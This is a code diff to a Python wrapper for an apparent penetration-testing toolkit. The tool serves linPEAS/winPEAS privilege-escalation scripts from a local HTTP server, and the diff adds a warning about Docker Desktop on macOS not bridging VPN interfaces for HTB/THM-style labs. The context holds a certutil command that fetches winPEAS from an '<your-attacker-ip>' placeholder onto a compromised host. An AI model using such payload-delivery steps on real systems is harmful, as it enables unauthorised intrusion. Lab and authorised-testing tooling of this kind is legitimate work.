@@ -26,7 +26,20 @@ class LinpeasTool(BaseTool):
         "`certutil -urlcache -f http://<your-attacker-ip>:8022/"
         "winPEASx64.exe winpeas.exe` (Windows). Click Stop once you've "
         "pulled the file — the server keeps running until then or the "
-        "timeout hits."
+        "timeout hits.\n\n"
+        "⚠ Docker Desktop on macOS: confirmed via a real run that its "
+        "port-forwarding proxy does NOT bridge VPN tunnel interfaces "
+        "(utun*, e.g. HTB's own VPN) at all, even with the port properly "
+        "published in docker-compose.yml — a real foothold shell got "
+        "'Connection refused' curling this host's VPN IP while the server "
+        "was genuinely running. Your real LAN IP and localhost both work "
+        "fine; only the VPN-routed address doesn't. If your target only "
+        "reaches you over a VPN (the common case for HTB/THM-style labs), "
+        "run OCULUS via the local, non-Docker `./run.sh`/CLI install "
+        "instead — a plain host process binds macOS's real network stack "
+        "directly and the VPN interface works normally. Fastest one-off "
+        "fix: skip this tool and just run `python3 -m http.server 8022` "
+        "yourself in a normal terminal, outside Docker entirely."
     )
     example = f"python3 -m http.server {_PEAS_PORT} --directory /opt/peas"
     install_hints = {
@@ -52,6 +65,27 @@ class LinpeasTool(BaseTool):
 
     def build_command(self, fast: bool = False) -> list[str]:
         return ["python3", "-m", "http.server", _PEAS_PORT, "--directory", str(_PEAS_DIR)]
+
+    def postprocess_output(self, output: str, exit_code: int) -> str:
+        # A real run's own output is just http.server's request log — it
+        # never shows whether the *tester's* target could actually reach
+        # this port at all (a "Connection refused" on their end never
+        # shows up here, since it never reached this server in the first
+        # place). Repeating the Docker-Desktop-on-macOS/VPN caveat here,
+        # not just in the static description above, since a tester
+        # watching this run for the first time is far more likely to
+        # actually read the live output than to have scrolled back up to
+        # the tool description before clicking Run.
+        return output + (
+            "\n\n⚠ If your foothold shell couldn't reach this (curl "
+            "'Connection refused'), and you're running OCULUS via Docker "
+            "on macOS, and your target reaches you over a VPN (HTB/THM-"
+            "style) — that's a known Docker Desktop limitation, not a "
+            "misconfigured port: its proxy doesn't bridge VPN tunnel "
+            "interfaces (utun*) at all. See this tool's own description "
+            "for the fix (run via ./run.sh instead, or serve the file "
+            "yourself outside Docker)."
+        )
 
     def mock_output(self) -> str:
         return f"""\
